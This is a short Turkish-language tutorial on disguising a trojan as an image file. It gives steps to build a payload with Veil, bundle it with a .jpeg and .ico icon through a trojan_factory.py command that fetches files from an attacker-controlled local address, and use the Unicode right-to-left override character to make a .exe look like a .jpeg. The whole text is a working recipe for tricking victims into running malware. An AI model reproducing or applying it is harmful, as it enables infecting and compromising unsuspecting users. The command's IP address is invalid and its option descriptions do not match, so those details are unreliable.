# Trojan ile Görsel Birleştirme

#### 1. İlk olarak görselimizi (.jpeg) seçip google üzerinden uzantısını ```.ico```'ya çeviriyoruz 
#### 2. ```Veil``` kullanarak trojan'i oluşturuyoruz
#### 3. İndirdiğimiz ```.ico``` uzantılı görsel ile trojan'i aynı dosya içine atıyoruz
#### 4. Dosya içine girip ```python3 trojan_factory.py -f http://192.168.123.456/backdoors/andorid.jpeg -e http://192.168.123.456/backdoors/mynewpayload.exe -o /opt/trojanfactory/newtest.exe ; http://192.168.123.456/backdoors/android.ico``` çalıştırıyoruz

* -f: .jpeg dosyasının konumu
* -e: trojan'in konumu
* -o: .ico'nun konumu 
---
# Trojan Uzantısını Değiştirme

#### 1. ```apt-get install gnome-characters``` karakter paketini indiriyoruz
#### 2. İndirdiğimiz framework'ü açıyoruz ve arama yerine ```right-to-right``` yazıp çıkan şeyi kopyalıyoruz
#### 3. ```.exe``` dosyamızın sonunda ```gepj.exe``` yazıyoruz
#### 3. ```gepj.exe``` kısımını seçip ```ctrl+v``` yapıyoruz ve dosya uzantısı ```.jpeg``` olarak gözüküyor

### ```right-to-left``` characters kısmında yoksa google'a ```unicode-table``` yazıp çıkan siteden kopyalabiliriz ```U+202E```
